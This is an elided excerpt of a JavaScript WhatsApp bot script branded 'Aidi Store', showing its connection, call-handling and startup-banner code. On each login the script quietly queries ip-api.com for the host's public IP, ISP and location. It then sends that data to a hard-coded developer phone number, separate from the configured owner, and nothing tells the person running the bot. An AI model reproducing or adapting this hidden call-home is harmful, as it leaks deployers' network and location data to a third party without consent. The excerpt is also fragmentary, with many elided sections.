...
arietube.autoReconnect = ReconnectMode.onConnectionLost
    ...
    arietube.browserDescription = ['Aidi Store','Desktop','3.0']
    await sleep(7000)
    arietube.on('qr', qr => {
 ...
 console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Official Aidi Store', 'cyan'))
 arietube.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(arietube.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Aidi Store",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/arietube.jpg'),sourceUrl:"https://wa.me/6288245009287?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       arietube.sendMessage("6288245009287@s.whatsapp.net", `─────「 *LOGIN BERHASIL BANG ARIE TUBE* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Aidi Store",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/arietube.jpg'),sourceUrl:"https://wa.me/6289682002547?text=Assalamualaikum"}}})
...
arietube.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
		...
		bumess = [{buttonId: `!000`, buttonText: {displayText: `Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n*AKU MAU BILANG JANGAN LUPA BELANJA DI AIDI STORE👌😀*`}, type: 1}]
			const masukan = {
    contentText: `${masuk}`,
...
arietube.on('CB:action,,call', async json => {
        ...
        arietube.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/arietube.jpg'),sourceUrl:`https://wa.me/6289682002547?text=Assalamualaikum`}}})
        await sleep(5000)
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Subcribe : Aidi Store', 'red'))})}, 200 ) ;
	}
	else
	{
...
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
	    ...
	    }), 'lightgreen')), term.slowTyping('By Denis Putra - Recode by Aidi Store' ,{ flashStyle: term.brightWhite })
